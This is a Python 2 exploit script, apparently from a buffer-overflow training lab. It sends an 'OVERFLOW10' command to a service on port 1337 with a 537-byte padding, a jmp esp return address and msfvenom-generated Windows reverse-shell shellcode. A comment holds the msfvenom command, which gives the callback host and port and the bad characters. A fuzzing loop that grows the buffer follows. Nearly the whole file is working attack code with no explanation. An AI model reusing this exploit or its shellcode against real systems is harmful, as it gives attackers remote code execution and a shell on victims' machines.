#!/usr/bin/python

import socket, time, sys

remoteip="10.10.215.6"
remoteport=1337
size=537
offset = "A" * size
#jmp esp 625011AF
eip= "\xaf\x11\x50\x62"
#badchars \x00\xa0\xad\xbe\xde\xef
#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\xa0\xad\xbe\xde\xef" -v esp -f python
esp =  b"\x90" * 16
esp += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
esp += b"\x76\x0e\xa4\x76\x09\x7a\x83\xee\xfc\xe2\xf4\x58\x9e"
esp += b"\x8b\x7a\xa4\x76\x69\xf3\x41\x47\xc9\x1e\x2f\x26\x39"
esp += b"\xf1\xf6\x7a\x82\x28\xb0\xfd\x7b\x52\xab\xc1\x43\x5c"
esp += b"\x95\x89\xa5\x46\xc5\x0a\x0b\x56\x84\xb7\xc6\x77\xa5"
esp += b"\xb1\xeb\x88\xf6\x21\x82\x28\xb4\xfd\x43\x46\x2f\x3a"
esp += b"\x18\x02\x47\x3e\x08\xab\xf5\xfd\x50\x5a\xa5\xa5\x82"
esp += b"\x33\xbc\x95\x33\x33\x2f\x42\x82\x7b\x72\x47\xf6\xd6"
esp += b"\x65\xb9\x04\x7b\x63\x4e\xe9\x0f\x52\x75\x74\x82\x9f"
esp += b"\x0b\x2d\x0f\x40\x2e\x82\x22\x80\x77\xda\x1c\x2f\x7a"
esp += b"\x42\xf1\xfc\x6a\x08\xa9\x2f\x72\x82\x7b\x74\xff\x4d"
esp += b"\x5e\x80\x2d\x52\x1b\xfd\x2c\x58\x85\x44\x29\x56\x20"
esp += b"\x2f\x64\xe2\xf7\xf9\x1e\x3a\x48\xa4\x76\x61\x0d\xd7"
esp += b"\x44\x56\x2e\xcc\x3a\x7e\x5c\xa3\x89\xdc\xc2\x34\x77"
esp += b"\x09\x7a\x8d\xb2\x5d\x2a\xcc\x5f\x89\x11\xa4\x89\xdc"
esp += b"\x2a\xf4\x26\x59\x3a\xf4\x36\x59\x12\x4e\x79\xd6\x9a"
esp += b"\x5b\xa3\x9e\x10\xa1\x1e\x03\x77\x8a\xaf\x61\x78\xa4"
esp += b"\x77\xb2\xf3\x42\x1c\x19\x2c\xf3\x1e\x90\xdf\xd0\x17"
esp += b"\xf6\xaf\x21\xb6\x7d\x76\x5b\x38\x01\x0f\x48\x1e\xf9"
esp += b"\xcf\x06\x20\xf6\xaf\xcc\x15\x64\x1e\xa4\xff\xea\x2d"
esp += b"\xf3\x21\x38\x8c\xce\x64\x50\x2c\x46\x8b\x6f\xbd\xe0"
esp += b"\x52\x35\x7b\xa5\xfb\x4d\x5e\xb4\xb0\x09\x3e\xf0\x26"
esp += b"\x5f\x2c\xf2\x30\x5f\x34\xf2\x20\x5a\x2c\xcc\x0f\xc5"
esp += b"\x45\x22\x89\xdc\xf3\x44\x38\x5f\x3c\x5b\x46\x61\x72"
esp += b"\x23\x6b\x69\x85\x71\xcd\xe9\x67\x8e\x7c\x61\xdc\x31"
esp += b"\xcb\x94\x85\x71\x4a\x0f\x06\xae\xf6\xf2\x9a\xd1\x73"
esp += b"\xb2\x3d\xb7\x04\x66\x10\xa4\x25\xf6\xaf"
buffer = offset + eip + esp

while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    s.send("OVERFLOW10 " + buffer + '\r\n')
    print s.recv(1024)
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print "-------------------------"
